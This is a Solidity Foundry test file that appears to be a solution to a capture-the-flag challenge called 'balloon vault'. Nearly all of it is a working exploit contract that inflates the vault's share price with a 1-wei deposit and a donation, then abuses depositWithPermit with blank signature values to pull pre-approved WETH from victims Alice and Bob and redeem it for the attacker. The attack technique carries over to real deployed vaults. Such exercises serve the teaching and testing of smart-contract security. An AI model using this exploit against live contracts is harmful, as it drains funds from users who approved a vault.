// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {WETH} from "../src/5_balloon-vault/WETH.sol";
import {BallonVault} from "../src/5_balloon-vault/Vault.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/
contract BallonVaultAttack {
    WETH public weth;
    BallonVault public vault;
    address public attacker;

    constructor(address _weth, address _vault) {
        weth = WETH(payable(_weth));
        vault = BallonVault(_vault);
        attacker = msg.sender;
    }

    // Attack function to drain the WETH balance of the victim
    function attack(address victim) external {
        require(msg.sender == attacker, "Only attacker can attack");
        require(weth.balanceOf(address(this)) > 0, "Contract has no WETH balance");
        require(weth.balanceOf(victim) > 0, "Victim has no WETH balance");

        while (weth.balanceOf(victim) > 0) {
            // Step 1: Deposit 1 wei to get 1 share
            weth.approve(address(vault), 1);
            vault.deposit(1, address(this));

            // Step 2: Transfer remaining balance directly to vault
            uint256 donationAmount = weth.balanceOf(address(this));
            weth.transfer(address(vault), donationAmount);

            // Step 3: Force victim's deposit
            uint256 victimBalance = weth.balanceOf(victim);
            uint256 amountToSteal = victimBalance < donationAmount ? victimBalance : donationAmount;
            vault.depositWithPermit(victim, amountToSteal, 0, 0, 0, 0);

            // Step 4: Withdraw all funds
            vault.redeem(1, address(this), address(this));
        }
    }

    // Withdraw all WETH to attacker
    function withdraw() external {
        require(msg.sender == attacker, "Only attacker can withdraw");
        weth.transfer(attacker, weth.balanceOf(address(this)));
    }

    // Function to receive ETH
    receive() external payable {}
}
/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/

contract Challenge5Test is Test {
    BallonVault public vault;
    WETH public weth = new WETH();

    address public attacker = makeAddr("attacker");
    address public bob = makeAddr("bob");
    address public alice = makeAddr("alice");

    function setUp() public {
        vault = new BallonVault(address(weth));

        // Attacker starts with 10 ether
        vm.deal(address(attacker), 10 ether);

        // Set up Bob and Alice with 500 WETH each
        weth.deposit{value: 1000 ether}();
        weth.transfer(bob, 500 ether);
        weth.transfer(alice, 500 ether);

        vm.prank(bob);
        weth.approve(address(vault), 500 ether);
        vm.prank(alice);
        weth.approve(address(vault), 500 ether);
    }

    function testExploit() public {
        vm.startPrank(attacker);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge5Test -vvvv //
        ////////////////////////////////////////////////////*/

        // Deploy the attack contract
        BallonVaultAttack attackContract = new BallonVaultAttack(address(weth), address(vault));

        // send attacker 10 WETH to the attack contract
        weth.deposit{value: 10 ether}();
        weth.transfer(address(attackContract), 10 ether);

        // Attack alice to drain the WETH balance
        attackContract.attack(alice);

        // Attack bob to drain the WETH balance
        attackContract.attack(bob);

        // Withdraw all WETH to attacker
        attackContract.withdraw();

        //==================================================//
        vm.stopPrank();

        assertGt(weth.balanceOf(address(attacker)), 1000 ether, "Attacker should have more than 1000 ether");
    }
}
